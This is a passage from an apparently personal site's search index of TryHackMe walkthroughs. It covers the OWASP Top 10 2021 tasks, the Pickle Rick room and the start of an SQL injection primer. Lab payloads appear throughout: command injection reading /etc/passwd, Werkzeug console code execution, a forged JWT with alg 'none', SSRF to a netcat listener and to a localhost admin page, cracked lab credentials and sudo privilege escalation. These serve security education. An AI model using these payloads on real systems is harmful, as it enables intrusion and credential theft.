provides us with a simple web application which, after correctly authenticating ourselves, we are presented with a list of things we need to buy from a store.</p> <p></p> <p>If we look at the URL, we notice that application exposes the direct object reference through the note_id parameter which points to specific accounts.</p> <p></p> <p>By altering the note_id parameter, we are able to access information from other accounts. This is due to the web application not checking if the logged-in user owns or has permissions to access the referenced account.</p> <p>By modifying the note_id parameter to have the value <code>0</code> (ie: <code>note_id=0</code>), we can access the admin's account which contains the flag needed for this task.</p> <p></p> <p>Note that direct object references aren't necessarily a problem in themselves but rather issues arise from lack of authentication and validation controls implemented by developers.</p>"},{"location":"walkthroughs/thm/owasptop10_2021/#task-5-cryptographic-failures","title":"Task 5 - Cryptographic Failures","text":"<p>A cryptographic failure refers to any vulnerability arising from the misuse (or lack of use) of cryptographic algorithms for protecting sensitive information. Cryptographic failures often result in web applications accidentally divulging sensitive data.</p>"},{"location":"walkthroughs/thm/owasptop10_2021/#prevention-methodology","title":"Prevention Methodology","text":"<p>The following are several methods which could be employed to prevent vulnerabilities arising from cryptographic failures: - Classify data processed, stored, or transmitted by an application in terms of sensitivity as required by privacy laws, regulatory requirements, or business needs. - Do not store sensitive data unnecessarily. - Encrypt all sensitive data at rest. - Ensure up-to-date and strong standard algorithms, protocols, and keys are in place with proper key management implementation. - Encrypt all data in transit with secure protocols. - Disable caching for response that contain sensitive data. - Apply required security controls as per the data classification. - Do not use legacy protocols such as FTP and SMTP for transporting sensitive data. - Store passwords using strong adaptive and salted hashing functions. - Always use authenticated encryption instead of just encryption.</p>"},{"location":"walkthroughs/thm/owasptop10_2021/#task-6-cryptographic-failures-supporting-material-1","title":"Task 6 - Cryptographic Failures (Supporting Material 1)","text":"<p>The most common way to store a large amount of data in a format easily accessible from many locations is in a database. Database engines usually follow the Structured Query Language (SQL) syntax.</p> <p>In a production environment, it is common to have databases set up on dedicated servers running a database service such as MySQL or MariaDB. It is also possible that databases can be stored as files (or flat-file databases) on a local hard-disk. Flat-file databases are much easier than setting up an entire database server. The most common (and simplest) format of a flat-file database is an SQLite database.</p> <p>In our scenario, the developer has stored an SQLite flat-file database in the root directory of the website. As a result, we are able to download and query the database file on our local machine with full access to everything in the database. Before we look at the challenge in subsequent tasks, let's review the syntax required to query an SQLite database. For our purposes, we will be using a utility called sqlite3.</p> <p>To access an SQLite database, we would use the <code>sqlite3 &lt;database-name&gt;</code> command. </p> <p>We can then list the tables in the database using the <code>.tables</code> command.</p> <p>We can get column in the table by using the <code>PRAGMA table_info(&lt;table-name&gt;);</code> command.</p> <p>Finally, we can dump the data from the table using the <code>SELECT * FROM &lt;table-name&gt;;</code> command.</p>"},{"location":"walkthroughs/thm/owasptop10_2021/#task-7-cryptographic-failures-supporting-material-2","title":"Task 7 - Cryptographic Failures (Supporting Material 2)","text":"<p>Sensitive data in databases is often stored as hashes. Hashes can be easily cracked if the developer uses a weak hashing algorithm. There are many tools which could be employed to crack hashes such as John the Ripper or Hashcat but for weak and vulnerable hashes such as MD5 hashes, we can use an online tool called Crackstation.</p>"},{"location":"walkthroughs/thm/owasptop10_2021/#task-8-cryptographic-failure-challenge","title":"Task 8 - Cryptographic Failure (Challenge)","text":"<p>Let's put what we have learned so far into practice.</p> <p>Navigating the the provided website and looking at the source-page, we find the existence of an <code>/assets</code> directory.</p> <p></p> <p>Navigating to the directory, we find the webapp.db database file which we can download.</p> <p></p> <p>Using the file command, we can verify that the file is an SQLite database type.</p> <p></p> <p>We can access the SQLite database file using the sqlite3 utility and enumerate the tables and columns.</p> <p></p> <p>Let's dump all the data contained in the users table.</p> <p></p> <p>We can see a row for the admin user in the data dump above <code>admin:6eea9b7ef19179a06954edd0f6c05ceb</code>.</p> <p>Using Crackstation to crack the admin user's hash we find the password: <code>admin:qwertyuiop</code></p> <p></p> <p>Using the credentials above, we can log-in as the admin user and retrieve the flag from the website.</p> <p></p>"},{"location":"walkthroughs/thm/owasptop10_2021/#task-9-injection","title":"Task 9 - Injection","text":"<p>Injection flaws are some of the most common vulnerabilities in applications today. Injection vulnerabilities occur when the application interprets user-controlled input as a valid command or parameter. Injection attacks depend on the underlying technology implemented in the application. SQL Injection (SQLi) and Command Injection are the two most common examples. - SQL Injection occurs when user-controlled input is passed to SQL queries. Without input sanitation, an attacker can pass in SQL queries to manipulate the output of such queries. - Command Injection occurs when user input is passed to system commands. An attacker can execute arbitrary system commands on application servers, potentially allowing them to access sensitive data.</p> <p>An application is vulnerable to injection attack when: - User-supplied data is not validated, filtered, or sanitized by the application. - Dynamic queries or non-parameterized calls without context-aware escaping are used directly in the interpreter. - Hostile data is used within object-relational mapping (ORM) search parameters to extract additional, sensitive records. - Hostile data is directly used or concatenated.</p> <p>Preventing injection requires keeping data separate from commands and queries: - The preferred option is to use safe API which avoids using the interpreter entirely. - Use positive server-side input validation. - For any residual dynamic queries, escape special characters using the specific escape syntax for that interpreter. - Use LIMIT and other SQL controls within queries to prevent mass disclosure of records in case of SQL injection.</p>"},{"location":"walkthroughs/thm/owasptop10_2021/#task-10-command-injection","title":"Task 10 - Command Injection","text":"<p>Command injection occurs when server-side code (such as PHP) in a web application makes a call to a function that interacts with the server's console directly. An injection web vulnerability allows an attacker to take advantage of that call to execute operating system commands arbitrarily on the server.</p>"},{"location":"walkthroughs/thm/owasptop10_2021/#code-example","title":"Code Example","text":"<p>Consider a scenario where a company (MooCorp) has started developing a web-based application for cow ASCII art with customizable text. The developers utilized the cowsay utility in Linux with a code wrapper calls the utility from the operating system's console and sends back its contents to the website. Let's look at the code used for this app.</p> <p><pre><code>&lt;?php\n    if (isset($_GET[\"mooing\"])) {\n        $mooing = $_GET[\"mooing\"];\n        $cow = 'default';\n\n        if(isset($_GET[\"cow\"]))\n            $cow = $_GET[\"cow\"];\n\n        passthru(\"perl /usr/bin/cowsay -f $cow $mooing\");\n    }\n?&gt;\n</code></pre> The above snippet of code does the following: 1. Check if the parameter \"mooing\" is set. If it is, the variable <code>$mooing</code> gets assigned the value of what was passed into the input field. 2. Check if the parameter \"cow\" is set. If it is, the variable <code>$cow</code> gets what was passed through the parameter. 3. The program executes the function <code>passthru(\"perl /usr/bin/cowsay -f $cow $mooing\");</code>. The passthru function simply executes a command in the operating system's console and sends the output back to the user's browser. The command is formed by concatenating the <code>$cow</code> and <code>$mooing</code> variables at the end of it. Since we can manipulate those variables, we can try injecting additional commands by using simple tricks.</p>"},{"location":"walkthroughs/thm/owasptop10_2021/#exploiting-command-injection","title":"Exploiting Command Injection","text":"<p>Now that we know how the application works, we can take advantage of a Bash feature called inline commands to abuse the cowsay server and execute any arbitrary command we want. Bash allows users to run commands within commands. This is useful for many reasons, but in our case, it will be used to inject command within the cowsay server to get it executed.</p> <p>To execute inline commands, we need to enclose them in the following format: <code>$(your_command_here)</code></p> <p>If the console detects an inline command, it will execute it first and then use the result as the parameter for the outer command. Look at the following example which runs <code>whoami</code> as an inline command inside the <code>echo</code> command.</p> <p></p> <p>Let's look at the cowsay service by navigating to the provided URL. We can begin off by listing all the files in the root directory of the web server using the <code>$ls -la</code> command.</p> <p></p> <p></p> <p>We can see that there are zero non-root/non-service/non-daemon users on the system using the <code>$(cat /etc/passwd)</code> command and going through all the users configured on the system.</p> <p>To determine what user the web application is running as, we can use the <code>$(whoami)</code> command.</p> <p></p> <p>We can determine the default shell <code>/sbin/nologin</code> for the apache user by looking at the output of <code>$(cat /etc/passwd)</code>.</p> <p></p> <p>The Linux version can be determined by looking at the contents of <code>/etc/os-release</code>.</p> <p></p>"},{"location":"walkthroughs/thm/owasptop10_2021/#task-11-insecure-design","title":"Task 11 - Insecure Design","text":"<p>Insecure design refers to vulnerabilities which are inherent to the application's architecture. These vulnerabilities are not related to bad implementation or configurations but instead the architecture of the application as a whole is flawed. Vulnerabilities related to insecure design often arise due to an improper threat modelling which is made during the planning phase of the application and propagates all the way up to the final application. Other times, vulnerabilities may be introduced due to \"shortcuts\" used by developers during the coding and testing process.</p> <p>Since insecure design vulnerabilities are introduced early in the development process, resolving them often requires refactoring/rebuilding the vulnerable part of the application. The best approach to avoiding such vulnerabilities is to perform threat modelling at the early stages of the development cycle. The following are a few tips on prevention: - Establish and use a secure development lifecycle. - Establish and use a library of secure design patterns. - Use threat modelling for critical authentication, access control, and key flows. - Integrate security language and controls into user stories. - Integrate plausibility checks at each tier of the application (frontend and backend). - Write unit and integration tests to validate that all critical flows are resistant to threat model. - Compile use-cases and misuse-cases for each tier of the application. - Segregate tier layers on the system and network layers depending on exposure and protection needed. - Segregate tenants by design throughout all tiers. - Limit resource consumption by user or service.</p> <p>Let's look at a practical example provided in this task. We are provided a URL will allows us to log into a user account. We are told that the application has a design flaw in its password reset mechanism. Let's figure out the weakness in the proposed design and abuse it to get our flag.</p> <p>Let's begin by attempting to reset the user's account password.</p> <p></p> <p>During the password reset stage, we are given a choice of security questions. One of the questions asks us to provide an answer to the user's (joseph) favourite colour. We also notice while trying to guess the answer that rate-limiting on failed attempts is not implemented. This means that we can brute-force the answer without getting locked in. Trying different primary colours as an answer we find that the answer green successfully resets the user's password (Password reset to: <code>9B6sDKvcr47fXF</code>).</p> <p></p> <p>We can now log into the user account with the credentials <code>joseph:9B6sDKvcr47fXF</code> to retrieve the flag.</p> <p></p>"},{"location":"walkthroughs/thm/owasptop10_2021/#task-12-security-misconfiguration","title":"Task 12 - Security Misconfiguration","text":"<p>Security misconfigurations are distinct from other Top 10 vulnerabilities because they occur due to misconfigured security settings (purposefully or inadvertently). An application may be vulnerable if the application is: - Missing appropriate security hardening across any part of the application stack or improperly configured permissions on cloud services. - Unnecessary features are enabled or installed (ie: unnecessary ports, services, pages, accounts, or privileges). - Default accounts and their passwords are still enabled and unchanged. - Error handling reveals stack traces or other overly informative error messages to users. - Latest security features are disabled or not configured securely. - Not using HTTP security headers. - The software is out of date or vulnerable.</p> <p>To prevent vulnerabilities arising from security misconfigurations, secure installation processes should be implemented, including: - A repeatable hardening process. - A minimal platform without any unnecessary features, components, documentation, and samples. - A task to review and update the configurations appropriately. - Review cloud storage permissions. - A segmented application architecture providing effective and secure separation. - Sending security directives to clients (ie: security headers). - An automated process to verify the effectiveness of the configurations and settings in all environments.</p> <p>A common security misconfiguration involves the exposure of debugging features in production software. Debugging features are often available in programming frameworks to allow the developer to access advanced functionality that is useful for debugging an application during the development and testing cycle. Let's look at a practical example of a web application running a Werkzeug console. Werkzeug is a key component in Python-based web applications as it provides an interface for web servers to execute the Python code. Werkzeug includes a debug console that can be accessed either via URL on <code>/console</code> (or if an exception is raised by the application). In both cases, the console provides a Python console that will run any code a user sends to it.</p> <p>Opening the URL provided by the task and navigating to <code>/console</code>, we are presented with a Werkzeug console.</p> <p></p> <p>Using the following code, we can get the console to execute system command (command injection) such as <code>ls -l</code> to list directory contents:</p> <p><pre><code>import os; print(os.popen(\"ls -l\").read())\n</code></pre> </p> <p>We can modify the above code to read the contents of the app.py file to retrieve the source code and the flag.</p> <p><pre><code>import os; print(os.popen(\"cat app.py\").read())\n</code></pre> </p>"},{"location":"walkthroughs/thm/owasptop10_2021/#task-13-vulnerable-and-outdated-components","title":"Task 13 - Vulnerable and Outdated Components","text":"<p>Vulnerable and outdated components are software components that are no longer being supported by the developer (deprecated features, libraries, APIs, etc.). Often times, a component has known vulnerabilities that don't get fixed due to lack of resources. Applications often become vulnerable to attacks because they use outdated software components with known security vulnerabilities.</p> <p>Some key ways vulnerabilities can appear in applications when using vulnerable or outdated components are as follows: - If you don't know the versions of all components you use (including nested dependencies). - If the software is vulnerable, unsupported, or out of date. - If you do not scan for vulnerabilities regularly and subscribe to security bulletins related the component in use. - If you do not fix, patch, or upgrade the underlying platform, framework, and dependencies in a risk-based timely manner. - If software developers do not test the compatibility of updated, upgraded, or patched libraries. - If you do not secure the components' configurations.</p> <p>Methods to prevent vulnerabilities arising from outdated components are as follows: - Remove unused dependencies, unnecessary features, components, files, and documents. - Continuously inventory the versions of both client-side and server-side components and their dependencies. - Only obtain components from official sources over secure channels. - Monitor for libraries and components that are unmaintained or do not create security patches for older versions.</p>"},{"location":"walkthroughs/thm/owasptop10_2021/#task-14-vulnerable-and-outdated-components-exploits","title":"Task 14 - Vulnerable and Outdated Components - Exploits","text":"<p>Key to determining vulnerabilities in applications is recon and enumeration. Our main job is to find out information on the software and research it until we can find an exploit for any vulnerabilities identified. A good resource for finding exploits is Exploit-DB or automated scripts such as Linux Exploit Suggester.</p>"},{"location":"walkthroughs/thm/owasptop10_2021/#task-15-vulnerable-and-outdated-components-lab","title":"Task 15 - Vulnerable and Outdated Components - Lab","text":"<p>In this task, we will be looking at an example. We are presented with a URL for a vulnerable web application. Clicking on the URL presents us with a CSE bookstore website make using PHP with MySQL.</p> <p>Looking through the source code, we don't see anything unusual. We do notice that at the there is an Admin Login page located at <code>/admin.php</code>. Searching for book store 1.0 on Exploit-DB, we find several exploits.</p> <p></p> <p>Since the task requires us to find the contents of the <code>/opt/flag.txt</code> file, we will require an exploit that does a remote code execution.</p> <p></p> <p>The above exploit creates a shell. Let's download and execute the exploit.</p> <p></p> <p>With the shell created, we can now get the contents of the flag from the <code>/opt/flag.txt</code> file.</p> <p></p>"},{"location":"walkthroughs/thm/owasptop10_2021/#task-16-identification-and-authentication-failures","title":"Task 16 - Identification and Authentication Failures","text":"<p>Authentication and session management makeup core components of modern web applications. Authentication controls allow users to gain access to resources by verifying their identities. The most common method of authentication via the username and password mechanism. In this type of a system, a user will provide their credentials to the server which in turn would verify the user's identity and provide the user's browser with a session cookie. A session cookie is needed because web servers use HTTP(S) to communicate which are stateless in nature. Attacking session cookies means the server will know who is sending what data.</p> <p>Authentication weaknesses can arise in applications if the application: - Permits automated attacks such as credential stuffing where the attacker has a list of valid usernames and passwords. - Permits brute force or other automated attacks. - Permits default, weak, or well-known passwords. - Uses weak or ineffective credential recovery and forgot-password processes such as \"knowledge-based\" answers which cannot be made safe. - Uses plain text, encrypted, or weakly hashed password data stores. - Has missing or ineffective multi-factor authentication. - Exposes session identifier in the URL. - Reuse session identifier after successful login. - Does not correctly invalidate Session IDs.</p> <p>Some methods to prevent weaknesses in authentication systems are: - Implement multi-factor authentication where possible. This prevents automated credential stuffing, brute force, and stolen credential reuse attacks. - Do not use any default credentials. - Implement weak password checks. - Limit or increasingly delay failed login attempts. Log all failures and alert administrators.  - Use server-side, secure, built-in session manager that generates a new random session ID with high entropy after login.</p>"},{"location":"walkthroughs/thm/owasptop10_2021/#task-17-identification-and-authentication-failures-practical","title":"Task 17 - Identification and Authentication Failures Practical","text":"<p>In this example, we will look at logic flaw within an authentication mechanism. We are told that the application is vulnerable to an exploit which allows re-registration of an existing user. Furthermore, we are told that the developer of the application did not implement input sanitization for the username and password fields.</p> <p>The task provides us with a URL for the vulnerable app and asks us to access the user darren account. Since we know that the application is vulnerable to re-registration attacks, we can create a new user account but with an extra space in the front: <code>darren</code> with password <code>pass123</code></p> <p></p> <p>With our user created successfully, we can now login with the credentials <code>darren:pass123</code>. Note the space in front of our new user. Due to the flawed logic implemented by the authentication verification check on the backend, the server will verify our new user as <code>darren</code> instead.</p> <p></p> <p>We are not asked to try the same method with the user arthur. Let's register a new user with the credentials <code>arthur:pass123</code>. Note the space in front of the new username. After successful registration, log in and retrieve the flag for the user <code>arthur</code>.</p> <p></p>"},{"location":"walkthroughs/thm/owasptop10_2021/#task-18-software-and-data-integrity-failures","title":"Task 18 - Software and Data Integrity Failures","text":"<p>Software and data integrity failures result from code and infrastructure that do no protect against integrity violations. One of the more common data integrity issues arise in situations when users or applications download updates for existing software. Without having a secure CI/CD pipeline with sufficient integrity verification, it is difficult to be certain that the data wasn't modified in transit or that the data is a malicious copy of the original.</p> <p>To circumvent these issues, most software distributors provide hashes to check a file's integrity. Users can recalculate hashes for their downloaded files and compare the local hash with the one published by the developer. In Linux, hashes can be calculated as follows:</p> <p><pre><code>$ md5sum &lt;file_name&gt;\n$ sha1sum &lt;file_name&gt;\n$ sha256sum &lt;file_name&gt;\n</code></pre> There are two types of vulnerabilities in this category: - Software Integrity Failures - Data Integrity Failures</p>"},{"location":"walkthroughs/thm/owasptop10_2021/#task-19-software-integrity-failures","title":"Task 19 - Software Integrity Failures","text":"<p>Suppose you develop an website which uses third-party libraries that are stored remotely in some external server that out of your control (ie: jQuery). When a user accesses your website, their browser will read the HTML code and download the third-party library from the specified external source. </p> <p>Now consider an attacker who is able to either intercept the download of the library (MTIM) and inject a malicious payload or somehow is able to hack the remote server and replace the original with a malicious copy of the library. Anyone visiting your website would now be accessing the malicious code and execute it in their browsers unknowingly. This is a software integrity failure as the website makes no checks against the third-party library to see if it has changed.</p> <p>Lucky for us, modern browsers provide the capability to specify a hash along with a library's URL so that the library code is executed only if the hash of the downloaded file matches the expected value. This security mechanism is called Subresource Integrity (SRI).</p>"},{"location":"walkthroughs/thm/owasptop10_2021/#task-20-data-integrity-failures","title":"Task 20 - Data Integrity Failures","text":"<p>When a user logs into an application, the server will assign some sort of session token that will need to be saved locally on the user's browser for as long as the server lasts. This token is then repeated on each subsequent web request so that the application knows who is making the requests. The most common way these session tokens are assigned is through the use of cookies. Cookies are key-value pairs that a web application will store on the user's browser and will be automatically repeated on each web request to the website by the user.</p> <p>Developers often use existing token implementations with one of the more popular recently being the JSON Web Tokens (JWT). JWT are simple tokens that allow storage of key-value pairs on a token that provides integrity as part of the token. A generated token can be shared with the user with the certainty that the end-user would not be able to alter the key-value pairs and still pass the integrity check. The structure of a JWT token is formed of 3 parts:</p> <p></p> <p>In the above example, the header portion of the JWT token contains metadata indicating that this is a JWT with a signing algorithm of HS256. The payload contains the key-value pairs with the data that the web application wants the client to store. The signature is similar to a hash. If a user changes the payload, the web application can verify that the signature won't match the payload and know that the JWT has been tampered with. Unlike simple hash, this signature involves the use of a secret key held by the server alone. This means that by simply changing the payload, an attacker won't be able to generate the matching signature unless they know the secret key.</p> <p>Note that each of the three parts of JWT token are simply plaintext encoded with base64. The signature contains binary data which won't make much sense even after decoding the base64.</p>"},{"location":"walkthroughs/thm/owasptop10_2021/#jwt-and-the-none-algorithm","title":"JWT and the None Algorithm","text":"<p>A while ago, a data integrity failure vulnerability was found in some libraries implementing JWT tokens. The vulnerable libraries allowed attackers to bypass the signature validation by changing the following parameters in a JWT token: 1. Modify the header so that the <code>alg</code> parameter contained the value <code>none</code>. 2. Remove the signature part.</p> <p>This permitted attackers, to modify the JWT tokens and bypass signature verification checks. Let's see this in practice.</p> <p>Navigating to the URL provided and authenticating with the credentials <code>guest:guest</code>, we are logged into the web application. After the successful login, we notice in our browser's developer tools that a JWT token has been assigned to us and is stored as a cookie.</p> <p></p> <p>We can copy the JWT token and decode it to see the plaintext header and payload.</p> <p><pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjg1MTI0NzQ5fQ.mrBUgRYiNh-uV8I_ZVY9CrNu4Q2HYoI_Kj0sKMqVlXM\n</code></pre> <pre><code>{\"typ\":\"JWT\",\"alg\":\"HS256\"}{\"username\":\"guest\",\"exp\":1685124749}    \u00ab\u0005H\u0011b#a\u00b9_\beV=\n\u00b3n\u00e1\n\u0087b\u0082\n\u008fK\n2\u00a5e\\\n</code></pre> Let's modify the token above by modifying the <code>alg</code> parameter to have the value <code>none</code> and removing the signature part of the token.</p> <p><pre><code>{\"typ\":\"JWT\",\"alg\":\"none\"}{\"username\":\"admin\",\"exp\":1685124749}\n</code></pre> We can now re-encode the token as base64. I had to encode the header and payload separately as doing it together did not produce the correct encoded value. Note that the header, payload, and signature fields need to be separated by a <code>.</code> in order for it to be interpreted as a valid JWT token.</p> <p><pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjg1MTI0NzQ5fQ==.\n</code></pre> Updating the cookie value in our browser with our modified token and doing a hard refresh of the web application (CTRL + R), we are able to bypass authentication check for the admin user and retrieve the flag.</p> <p></p>"},{"location":"walkthroughs/thm/owasptop10_2021/#task-21-security-logging-and-monitoring","title":"Task 21 - Security Logging and Monitoring","text":"<p>Good security practices dictate that when web applications are set up and deployed, every action performed by an end-user should be logged. Logging is helpful when performing incidence response and threat detection as an attackers activities can be traced. Without logging and monitoring, breaches cannot be detected. Typical information stored in logs should include the following: - HTTP status codes - Time stamps - Usernames - API endpoint/page locations - IP addresses</p> <p>As these types of logs have sensitive information, it is important to ensure that they are stored securely and that multiple copies of these logs are stored at different locations. As logging is useful in DFIR situations, analysts need to be on the lookout for common examples of suspicious activities like - Multiple unauthorized attempts for a particular action. - Requests from anomalous IP addresses or locations. - Use of automated tools. - Common payloads.</p> <p>All suspicious activities should be rated according to the impact level.</p>"},{"location":"walkthroughs/thm/owasptop10_2021/#task-22-server-side-request-forgery-ssrf","title":"Task 22 - Server-Side Request Forgery (SSRF)","text":"<p>SSRF vulnerabilities arise when an attacker forces a web application into sending requests on their behalf to arbitrary destinations while having control of the contents of the request itself. These vulnerabilities are typical for implementations where web applications need to use third-party services.</p> <p>In general, SSRF can be used for: - Enumerating internal networks, including IP addresses and ports (even when protected by firewalls and VPNs). - Abuse trust relationships between servers and gain access to otherwise restricted services. - Interact with some non-HTTP services to get RCEs.</p> <p>See the task material on TryHackMe for an in depth example.</p> <p>Let's look a simple example of SSRF vulnerability. Navigating to the URL provided, we find a simple web application which is vulnerable to SSRF. Exploring the website, we find an admin interface which is only accessible from localhost.</p> <p></p> <p>Looking at link for the Download Resume button, we see that the server parameter points to <code>secure-filestorage.com</code>. As the server parameter is exposed to the user, we can employ SSRF to send to request to our machine.</p> <p></p> <p>Let's start by setting up Netcat listener on port 80 to intercept the request.</p> <p><pre><code>nc -lvp 80\n</code></pre> We can now force the web application to forward the request to our machine by modifying the server and port parameter in the URL.</p> <p><pre><code>http://10.10.130.112:8087/download?server=10.13.17.49:80&amp;id=75482342\n</code></pre> We can retrieve the flag from the captured response.</p> <p></p>"},{"location":"walkthroughs/thm/owasptop10_2021/#going-the-extra-mile","title":"Going the Extra Mile","text":"<p>In order to get the flag for the going the extra mile, we need to point the server address to <code>localhost</code>. The URL for the download request button is constructed in the following way:</p> <p><pre><code>http://10.10.203.80:8087/download?server=secure-file-storage.com:8087&amp;id=75482342\n</code></pre> The <code>?</code> after <code>/download</code> denotes a separator and does not form part of the query string of the multiple query parameters <code>server=</code> and <code>id</code>. Note that the multiple query parameters are separated by <code>&amp;</code> in the URL. The query string parameters dictate the content to show on the page. In our case, the web application is looking for two strings, server and id. The web application returns an error if one of the key-value pairs is missing or malformed. We can notice this by putting a random value of <code>id=test</code>. The following segment of code is returned as part of the error page:</p> <pre><code> file_id = request.args.get('id','')\n    server = request.args.get('server','')\n    if file_id!='':\n        filename = str(int(file_id)) + '.pdf'\n\n        response_buf = BytesIO()\n        crl = pycurl.Curl()\n        crl.setopt(crl.URL, server + '/public-docs-k057230990384293/' + filename)\n        crl.setopt(crl.WRITEDATA, response_buf)\n</code></pre> <p>Note that the web application is running a Python interpreter in the background.</p> <p>We can modify the URL to point to <code>server=localhost:8087/admin</code>. However this causes the page to hang as the requested resource is not available. The resultant URL in the backend based on the above code would be as follows:</p> <p><pre><code>http://localhost:8087/admin/public-docs-k057230990384293/75482342.pdf\n</code></pre> We can bypass this and access the <code>/admin</code> page by using appending <code>?a=</code> to our server value. This results in the following URL being formed by the backend code:</p> <p><pre><code>http://localhost:8087/admin?a=/public-docs-k057230990384293/id=75482342\n</code></pre> Our resultant URL query to trigger SSRF is as follows:</p> <pre><code>http://10.10.203.80:8087/download?server=localhost:8087/admin?a=&amp;id=75482342\n</code></pre> <p></p>"},{"location":"walkthroughs/thm/picklerick/","title":"Pickle Rick","text":""},{"location":"walkthroughs/thm/picklerick/#reconosint","title":"Recon/OSINT","text":"<p>Target IP: 10.10.60.146 ($IP) Website: https://10-10-60-146.p.thmlabs.com/</p> <p>Looking at the page source for the website:</p> <p>Username: R1ckRul3s</p> <p>Checking <code>robots.txt</code>:</p> <p>Wubbalubbadubdub</p>"},{"location":"walkthroughs/thm/picklerick/#enumeration","title":"Enumeration","text":""},{"location":"walkthroughs/thm/picklerick/#nmap-scan","title":"Nmap Scan","text":""},{"location":"walkthroughs/thm/picklerick/#feroxbuster-scan","title":"Feroxbuster Scan","text":"<p>Looks like Feroxbuster found an <code>/assets</code> directory and <code>/login.php</code> page. <code>/assets</code> contains a few Javascript, CSS, and image files; none of which are of any particular importance.</p>"},{"location":"walkthroughs/thm/picklerick/#exploit","title":"Exploit","text":"<p>Successfully logged in on <code>https://10-10-60-146.p.thmlabs.com/login.php</code> using <code>R1ckRul3s</code> and <code>Wubbalubbadubdub</code>.</p> <p>Looks like we are presented with some sort of a command panel which executes linux commands put in the text field.</p> <p>Running the <code>ls</code> command:</p> <p></p> <p>Running <code>cat</code> on <code>Sup3rS3cretPickl3Ingred.txt</code> reveals that the <code>cat</code> command is disabled.</p> <p></p> <p>Need to find some other way to display contents of the <code>Sup3rS3cretPickl3Ingred.txt</code> file.</p> <p>Using <code>less</code> command we find the first ingredient Rick needs is <code>mr. meeseek hair</code>.</p> <p></p> <p>Looking at the contents of <code>clue.txt</code> reveals that we need to look around the file system for other ingredients.</p> <p>Running command <code>ls /home/rick</code> reveals the a file containing the second ingredient.</p> <p></p> <p>Reading contents of the <code>/home/rick/second ingredients</code> reveals that the second ingredient Rick needs is <code>1 jerry tear</code>. Due to the space in the file name, use single quotes around the path to read the contents.</p> <pre><code>$ less '/home/rick/second ingredients'\n</code></pre>"},{"location":"walkthroughs/thm/picklerick/#privilege-escalation","title":"Privilege Escalation","text":"<p>Running command <code>sudo -l</code> shows that user-data may run all commands without password.</p> <p></p> <p>Running <code>whoami</code> reveals that we are running as <code>www-data</code> which means we should be able to execute any command without password.</p> <p>Running <code>sudo -la /root</code> reveals the a file with third ingredient.</p> <p>Reading contents of <code>3rd.txt</code> using <code>sudo less /root/3rd.txt</code> reveals that the third ingredient Rick needs is <code>fleeb juice</code>.</p>"},{"location":"walkthroughs/thm/sqlinjection/","title":"SQL Injection","text":""},{"location":"walkthroughs/thm/sqlinjection/#resources","title":"Resources","text":"<p>Following a list of useful resources and cheat sheets related to SQL Injection.</p> <ul> <li>PortSwigger - SQL Injection Cheat Sheet</li> <li>Payload All the Things - SQL Injection</li> <li>Websec - SQL Injection</li> <li>HackTricks - SQL Injection</li> <li>OWASP - SQL Injection Prevention</li> </ul>"},{"location":"walkthroughs/thm/sqlinjection/#introduction","title":"Introduction","text":"<p>Structured Query Language Injection (SQLi) is an attack on a web application database server that causes malicious queries to be executed. Injection vulnerabilities arise when a web application communicates with a database without syntactic validation of a user's input.</p>"},{"location":"walkthroughs/thm/sqlinjection/#database-fundamentals","title":"Database Fundamentals","text":"<p>Database is a way of digitally storing collections of data in an organized manner. A database is controlled by a Database Management System (DBMS). These systems fall into two either being <code>Relational</code> or <code>Non-Relational</code>. A DBMS can house multiple databases with each database containing its own set of related data.</p> <p><pre><code>graph TD;\n    A[DBMS]--&gt;B[DB1];\n    A--&gt;C[DB2];\n    B--&gt;T1[Table 1];\n    B--&gt;T2[Table 2];\n    C--&gt;T3[Table 3];\n    C--&gt;T4[Table 4];</code></pre> </p> <p>A <code>relational database</code> is simply a collection of datasets with pre-defined relationships between them. These datasets are organized as a set of tables with columns and rows, making it easy to see and understand how different data structures relate to each other. Each table  typically contains a column with a unique ID (primary key) which is used by other tables as a reference thus creating relationships between tables. Popular examples of relational databases include <code>Microsoft SQL Server, MySQL, PostgreSQL and MariaDB</code>.</p> <p>A <code>non-relational database</code> does not use tables, columns and rows (ie. <code>tabular schema</code>). Typically a non-relational databases are employed to use a data storage model that is optimized for the specific requirements of the type of data being stored. This lack of structure limitation can have the benefit of providing flexibility over a relational database. Non-relational databases are sometimes referred to as <code>NoSQL</code> and popular examples include <code>MongoDB, Cassandra and ElasticSearch</code>.</p>"},{"location":"walkthroughs/thm/sqlinjection/#tables","title":"Tables","text":"<p>A table is made up of columns and rows (not dissimilar from a Microsoft Excel worksheet).</p> <p>In a table, each column is referred to as a <code>field</code> and has a unique name per table. Each column has a dataset type assigned to it which indicates what type of data it will store (ie. integer, strings or dates). As stated earlier, each table typically contains a column with some manner of a unique ID (<code>key</code> field) which permits relations to be formed between tables along with the ability to find specific row entries in SQL queries.</p> <p>Rows or <code>records</code> contain individual datasets. When new data is added to a database, a new row is created. Inversely, a row is deleted whenever a record is removed.</p>"},{"location":"walkthroughs/thm/sqlinjection/#structured-query-language-sql","title":"Structured Query Language (SQL)","text":"<p>SQL is used for querying databases. Queries to databases are referred to as <code>statements</code>. The most common commands/statements when interfacing with databases include retrieving, updating, inserting and deleting datasets.</p> <p>It should be noted different database servers have their own syntax and slight variations on how things work. For the rest of these notes, syntax for MySQL databases will be used. Furthermore, it should be noted that SQL syntax is not case sensitive.</p>"},{"location":"walkthroughs/thm/sqlinjection/#select","title":"SELECT","text":"<p>Data is retrieved from a database using the <code>SELECT</code> statement. Take for example the statement below.</p> <p><pre><code>SELECT * FROM users;\n</code></pre> SELECT tells the database that we want to retrieve some data from the database. The <code>*</code> lets the database know that we wish to retrieve all columns from the table. The <code>from users</code> portion of the statement tells the database which table to retrieve the data from (in this example the data is retrieved from the users table). The <code>;</code> at the end of the statement indicates to the database that this is the end of our query.</p> <p>Similarly, we can structure the statement to retrieve specific columns from the desired table. In this case, the <code>*</code> from earlier example statement is replaced with the field names of the desired columns (multiple columns can be retrieved by comma separating the fields).</p> <p>Take for example the table named users below.</p> id username password 1 admin password123 2 joe p4ssw0rd 3 jane qwerty <p></p> <p>The following statement would return only columns username and password.</p> <p><pre><code>SELECT username,password FROM users;\n</code></pre> </p> username password admin password123 joe p4ssw0rd jane qwerty <p></p> <p>While querying the database, we may need to limit the number 